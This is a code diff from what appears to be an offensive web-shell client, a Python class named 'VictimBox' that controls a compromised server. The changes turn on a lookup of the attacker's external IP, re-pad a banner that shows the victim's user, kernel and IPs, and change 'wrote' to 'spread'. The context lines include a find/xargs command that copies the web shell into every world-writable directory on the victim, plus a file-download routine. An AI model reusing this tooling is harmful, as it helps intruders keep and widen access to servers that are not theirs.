@@ -22,7 +22,7 @@ class VictimBox(object):
         self.host_ip = ', '.join(source[5:])
         try:
             # get the attacker's ip address thx to g0tmi1k and hostess
-            self.local_ip = ''  # (urlopen('http://ifconfig.me/ip').read()).strip()
+            self.local_ip = (urlopen('http://ifconfig.me/ip').read()).strip()
         except URLError:
             self.local_ip = 'Unknown'
 
@@ -35,18 +35,18 @@ class VictimBox(object):
         self.info = \
         '''
         {dashed}
-        {red}User{end}     :  {green}{current_user}{end}
-        {red}ID{end}       :  {green}{current_id}{end}
-        {red}Kernel{end}   :  {green}{kernel_info}{end}
-        {red}CWD{end}      :  {green}{cwd}{end}
-        {red}Uptime{end}   :  {green}{uptime}{end}
-        {red}Host IPs{end} :  {green}{host_ip}{end}
+        {red}User{end}        :  {green}{current_user}{end}
+        {red}ID{end}          :  {green}{current_id}{end}
+        {red}Kernel{end}      :  {green}{kernel_info}{end}
+        {red}CWD{end}         :  {green}{cwd}{end}
+        {red}Uptime{end}      :  {green}{uptime}{end}
+        {red}Host IPs{end}    :  {green}{host_ip}{end}
         {red}External IP{end} :  {green}{local_ip}{end}
         {dashed}
 
         {hot}[+] Available commands: {available_commands}.{end}
         {hot}[+] Inserting{end} {red}!{end} {hot}at the begining of the command will execute it on your box.{end}
-        '''.format(dashed='-' * int(len(self.kernel_info) + 12),
+        '''.format(dashed='-' * int(len(self.kernel_info) + 16),
                 red=Colors.RED, green=Colors.GREEN, end=Colors.END, hot=Colors.HOT,
                 current_user=self.current_user,
                 current_id=self.current_id,
@@ -73,7 +73,7 @@ class VictimBox(object):
         shell_name = getargs.url.split('/')[-1] if getargs.method == 'post' else provided_shell_name
         make_request.cmd = 'find {0} -xdev -type d \( -perm -0002 -a ! -perm -1000 \) | xargs -n 1 cp {1}'.format(self.source[3], shell_name)
         print make_request.get_page_source().read()
-        print '[+] Successfully wrote {0} to some writable paths\n[+] Type writable to check dirs'.format(shell_name)
+        print '[+] Successfully spread {0} to some writable paths\n[+] Type writable to check dirs'.format(shell_name)
 
     # a method for downloading files from the box
     def download_file(self, rfile_path, lfile_path):
